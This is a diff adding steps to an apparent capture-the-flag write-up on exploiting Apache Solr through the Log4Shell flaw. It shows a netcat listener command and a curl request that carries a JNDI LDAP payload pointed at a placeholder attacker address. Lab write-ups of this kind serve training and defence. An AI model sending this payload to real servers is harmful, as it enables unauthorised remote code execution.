@@ -66,6 +66,11 @@ Snippet of log:
 
 ## Exploitation
 
+- Open a netcat listener using `nc -lvnp <port of your choice>`
+- Use curl to exploit target
+    - `curl 'http://x.x.x.x:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:PORT\}'`
+- This confirms that we are able to exploit the server, but the room gives us a more detailed attack chain
+
 ### What is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections)
 
 ## Persistence
